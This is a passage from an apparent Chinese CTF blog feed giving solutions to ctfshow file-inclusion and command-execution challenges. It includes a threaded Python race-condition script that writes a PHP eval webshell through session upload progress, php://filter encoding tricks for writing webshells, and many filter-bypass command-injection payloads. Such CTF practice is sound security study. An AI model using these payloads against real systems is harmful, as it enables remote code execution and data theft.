class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>url = <span class="hljs-string">&quot;http://fc0d1b76-c5a1-495b-98ba-d7b85e5c7460.challenge.ctf.show/&quot;</span><br>sessID = <span class="hljs-string">&#x27;orange&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;, &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>                           data=&#123;<br>                               <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>                           &#125;,<br>                           cookies=&#123;<br>                               <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID<br>                           &#125;,<br>                           files=&#123;<br>                               <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;orange.png&#x27;</span>, fileBytes)<br>                           &#125;<br>                           )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessID, data=data,<br>                            cookies=&#123;<br>                                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID<br>                            &#125;)<br>        res2 = session.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------ok------&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):  <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br>        event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 唤醒线程</span><br></code></pre></td></tr></table></figure><h2 id="web83"><a class="markdownIt-Anchor" href="#web83"></a> web83</h2><p>和上面一致</p><h2 id="web84"><a class="markdownIt-Anchor" href="#web84"></a> web84</h2><p>和上面一致优化了一下代码，用都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>url = <span class="hljs-string">&quot;http://420c9489-80b6-4a27-a2ba-240311c8ef48.challenge.ctf.show/&quot;</span><br>sessID = <span class="hljs-string">&#x27;orange&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;, &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    file_bytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url,<br>                     data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,<br>                     cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;orange.png&#x27;</span>, file_bytes)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessID, data=data, cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID&#125;)<br>        res = session.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 假设成功后停止读取线程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_threads</span>(<span class="hljs-params">target, session, count=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        threading.Thread(target=target, args=(session,), daemon=<span class="hljs-literal">True</span>).start()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        start_threads(write, session)<br>        start_threads(read, session)<br><br>    threading.Event().wait()  <span class="hljs-comment"># 保持主线程运行</span><br><br></code></pre></td></tr></table></figure><p>由于是多线程，及时执行system也删不完，所以基本没什么用，之前的代码就行了</p><h2 id="web85"><a class="markdownIt-Anchor" href="#web85"></a> web85</h2><p>和上面一致</p><h2 id="web86"><a class="markdownIt-Anchor" href="#web86"></a> web86</h2><p>和上面一致</p><h2 id="web87"><a class="markdownIt-Anchor" href="#web87"></a> web87</h2><p>这题加入了post并且加入了死亡绕过，不是条件竞争了</p><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><p>rot13进行绕过</p><p>用<code>php://filter/write=string.rot13/resource=orange.php</code>进行写入，需要双url进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%66%25%37%32%25%36%31%25%36%65%25%36%37%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure><p>content写入简单的一句话木马然后rot13编码一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=&lt;?cuc @riny(<span class="hljs-variable">$_TRG</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>进入/orange.php 执行<code>?cmd=system('tac f*');</code></p><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><p>base64进行绕过</p><p>方法基本一致，用<code>php://filter/write=convert.base64-decode/resource=apple.php</code>进行双url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?filebr></code></pre></td></tr></table></figure><p>然后给一句话木马写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><p>前面多加两个字符，为了使前面的结合成功进行base64，剩下的都是一样的了</p><h2 id="web88"><a class="markdownIt-Anchor" href="#web88"></a> web88</h2><p>跟web79基本一致，需要微调一下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pO3dob2FtaSgpPz4x&amp;cmd=system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>中间的内容我写的是<code>&lt;?php eval($_GET['cmd']);whoami()?&gt;1</code></p><h2 id="web116"><a class="markdownIt-Anchor" href="#web116"></a> web116</h2><p>这个我不想下载视频，直接看答案<code>?file=flag.php</code></p><h2 id="web117"><a class="markdownIt-Anchor" href="#web117"></a> web117</h2><p>这题其实还是用伪协议进行绕过，只是禁用了常见的rot13和base64而已，换一个就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=orange.php<br>contents=?&lt;hp pe@av(l_<span class="hljs-variable">$OPTSj</span>[]z;)&gt;?<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>highlight_file(__FILE__);<br>file_put_contents(<span class="hljs-string">&quot;php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.php&quot;</span><br>, <span class="hljs-string">&quot;&lt;?php die();?&gt;?&lt;hp pvela<span class="hljs-subst">$(G_TE&#x27;[&#x27;a)</span>] ;&gt;?&quot;</span>); <br>?&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow命令执行</title>
    <link href="/2024/09/11/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/09/11/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p>前言:用了几天晚上时间把题目都过了一下，还是有值得学习的地方，炒冷饭也不失一种乐趣。web119-122的题目由于直接上传原文会对hexo的渲染模板可能造成模板注入，所以迫不得已上传的png</p><h2 id="web29"><a class="markdownIt-Anchor" href="#web29"></a> web29</h2><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=system(<span class="hljs-string">&quot;tac f*&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">tac</span> f*`;<br></code></pre></td></tr></table></figure><h2 id="web30"><a class="markdownIt-Anchor" href="#web30"></a> web30</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">tac</span> f*`;<br></code></pre></td></tr></table></figure><h2 id="web31"><a class="markdownIt-Anchor" href="#web31"></a> web31</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span>`<span class="hljs-built_in">tac</span>%09f*`;<br></code></pre></td></tr></table></figure><h2 id="web32"><a class="markdownIt-Anchor" href="#web32"></a> web32</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web33"><a class="markdownIt-Anchor" href="#web33"></a> web33</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web34"><a class="markdownIt-Anchor" href="#web34"></a> web34</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a class="markdownIt-Anchor" href="#web35"></a> web35</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web36"><a class="markdownIt-Anchor" href="#web36"></a> web36</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web37"><a class="markdownIt-Anchor" href="#web37"></a> web37</h2><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fla*.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><h2 id="web38"><a class="markdownIt-Anchor" href="#web38"></a> web38</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><h2 id="web39"><a class="markdownIt-Anchor" href="#web39"></a> web39</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fla*.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure><p>提前闭合</p><h2 id="web40"><a class="markdownIt-Anchor" href="#web40"></a> web40</h2><h3 id="0x01-3"><a class="markdownIt-Anchor" href="#0x01-3"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h3 id="0x02-3"><a class="markdownIt-Anchor" href="#0x02-3"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">eval</span>(end(current(get_defined_vars())));&amp;b=system(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web41"><a class="markdownIt-Anchor" href="#web41"></a> web41</h2><p>利用羽师傅的脚本直接跑出答案</p><h2 id="web42"><a class="markdownIt-Anchor" href="#web42"></a> web42</h2><p>%0a截断后面无用的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> flag.php%0a<br></code></pre></td></tr></table></figure><h2 id="web43"><a class="markdownIt-Anchor" href="#web43"></a> web43</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> flag.php%0a<br></code></pre></td></tr></table></figure><h2 id="web44"><a class="markdownIt-Anchor" href="#web44"></a> web44</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> fla?.php%0a<br></code></pre></td></tr></table></figure><h2 id="web45"><a class="markdownIt-Anchor" href="#web45"></a> web45</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>%09fla?.php%0a<br></code></pre></td></tr></table></figure><h2 id="web46"><a class="markdownIt-Anchor" href="#web46"></a> web46</h2><h3 id="0x01-4"><a class="markdownIt-Anchor" href="#0x01-4"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-4"><a class="markdownIt-Anchor" href="#0x02-4"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web47"><a class="markdownIt-Anchor" href="#web47"></a> web47</h2><h3 id="0x01-5"><a class="markdownIt-Anchor" href="#0x01-5"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-5"><a class="markdownIt-Anchor" href="#0x02-5"></a> 0x02</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?c<span class="hljs-punctuation">=</span>nl&lt;fl&#x27;&#x27;ag.php<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure><h2 id="web48"><a class="markdownIt-Anchor" href="#web48"></a> web48</h2><h3 id="0x01-6"><a class="markdownIt-Anchor" href="#0x01-6"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-6"><a class="markdownIt-Anchor" href="#0x02-6"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web49"><a class="markdownIt-Anchor" href="#web49"></a> web49</h2><h3 id="0x01-7"><a class="markdownIt-Anchor" href="#0x01-7"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-7"><a class="markdownIt-Anchor" href="#0x02-7"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web50"><a class="markdownIt-Anchor" href="#web50"></a> web50</h2><h3 id="0x01-8"><a class="markdownIt-Anchor" href="#0x01-8"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-8"><a class="markdownIt-Anchor" href="#0x02-8"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web51"><a class="markdownIt-Anchor" href="#web51"></a> web51</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web52"><a class="markdownIt-Anchor" href="#web52"></a> web52</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">ls</span><span class="hljs-variable">$IFS</span>/||<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$IFS</span>/fla?||<br></code></pre></td></tr></table></figure><h2 id="web53"><a class="markdownIt-Anchor" href="#web53"></a> web53</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=ca<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<br></code></pre></td></tr></table></figure><h2 id="web54"><a class="markdownIt-Anchor" href="#web54"></a> web54</h2><h3 id="0x01-9"><a class="markdownIt-Anchor" href="#0x01-9"></a> 0x01</h3><p>复制粘贴型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt<br></code></pre></td></tr></table></figure><h3 id="0x02-9"><a class="markdownIt-Anchor" href="#0x02-9"></a> 0x02</h3><p>全局查找，<code>-r</code>递归文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=grep<span class="hljs-variable">$&#123;IFS&#125;</span>-r<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&#x27;fla&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>.<br></code></pre></td></tr></table></figure><h2 id="web55"><a class="markdownIt-Anchor" href="#web55"></a> web55</h2><h3 id="0x01-10"><a class="markdownIt-Anchor" href="#0x01-10"></a> 0x01</h3><p>八进制转化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$<span class="hljs-string">&#x27;\154\163&#x27;</span> <span class="hljs-comment"># ls</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$<span class="hljs-string">&#x27;\164\141\143&#x27;</span> $<span class="hljs-string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span> <span class="hljs-comment"># tac flag.php</span><br></code></pre></td></tr></table></figure><h3 id="0x02-10"><a class="markdownIt-Anchor" href="#0x02-10"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。<br><br>但因为字母不能传入，我们需要使用通配符?来进行代替<br><br>?c=/bin/base64 flag.php<br><br>替换后变成<br><br>?c=/???/????64 ????.???<br></code></pre></td></tr></table></figure><h2 id="web56"><a class="markdownIt-Anchor" href="#web56"></a> web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题由于基本都禁了，需要用到文件上传到临时文件，利用glob通配符进行<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇</a>，已知A-Z在ASCII里面是被@和[包括的，那么可以使用<code>[@-[]</code>来表示，虽然是随机的，那么可以用<code>?c=.%20/???/????????[@-[] </code>进行匹配文件，这里需要上传一个文件，利用简单的html进行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 